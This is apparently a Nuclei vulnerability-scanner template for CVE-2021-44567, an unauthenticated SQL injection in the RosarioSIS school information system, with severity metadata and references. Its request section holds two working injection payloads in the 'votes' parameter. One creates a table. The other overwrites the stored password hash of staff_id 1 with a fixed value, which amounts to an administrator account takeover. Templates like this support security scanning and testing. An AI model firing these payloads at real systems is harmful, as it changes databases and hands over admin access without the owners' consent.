id: CVE-2021-44567

info:
  name: Unauthenticated SQL Injection in RosarioSIS
  author: ProjectDiscoveryAI
  severity: critical
  description: An unauthenticated SQL Injection vulnerability exists in RosarioSIS before 7.6.1 via the votes parameter in ProgramFunctions/PortalPollsNotes.fnc.php.
  impact: |
    Allows unauthenticated attackers to execute arbitrary SQL queries
  remediation: |
    Apply the vendor-supplied patch or update to the latest version of RosarioSIS
  reference:
    - https://gitlab.com/francoisjacquet/rosariosis/-/issues/308
    - https://gitlab.com/francoisjacquet/rosariosis/-/blob/mobile/CHANGES.md#changes-in-761
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-44567
    cwe-id: CWE-89
    epss-score: 0.00162
    epss-percentile: 0.53935
    cpe: cpe:2.3:a:rosariosis:rosariosis:*:*:*:*:*:*:*:*
  metadata:
    vendor: rosariosis
    product: rosariosis

http:
  - method: POST
    path:
      - "{{BaseURL}}/ProgramFunctions/PortalPollsNotes.fnc.php"

    headers:
      Content-Type: application/x-www-form-urlencoded; charset=UTF-8

    body: |
      votes['; CREATE TABLE notsosecure(t text) --]=hello
    matchers:
      - type: word
        words:
          - "CREATE TABLE"
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/ProgramFunctions/PortalPollsNotes.fnc.php"

    headers:
      Content-Type: application/x-www-form-urlencoded; charset=UTF-8

    body: |
      votes['; UPDATE staff SET password='$6$8f3d44f629ce994f$10QZrn8evmCTv2Nywt5jlWbL3hMbKmwPOeOqNVUzV5cr523ENoVj4FpWrvW1HGfn/XPAq0rwTFY7Eea3YPLOY/' WHERE staff_id='1'; --]=hello
    matchers:
      - type: word
        words:
          - "UPDATE staff"
        part: body
